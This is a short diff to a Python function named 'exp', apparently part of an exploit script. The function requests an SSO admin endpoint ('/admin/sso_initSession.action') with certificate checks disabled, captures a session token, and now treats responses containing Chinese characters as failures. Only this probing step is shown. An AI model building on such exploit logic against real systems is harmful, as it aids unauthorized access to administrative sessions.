@@ -78,7 +78,8 @@ def exp(url):
         response_sso_initSession = requests.get(url+"/admin/sso_initSession.action",headers=header,verify=False,timeout=5)
     except requests.RequestException:
         return 1
-    if response_sso_initSession.status_code != 200:
+    pattern = re.findall(r'[\u4e00-\u9fa5]',response_sso_initSession.text)
+    if response_sso_initSession.status_code != 200 or len(pattern) > 0:
         return 1
     
     sessionOne = response_sso_initSession.text.strip()
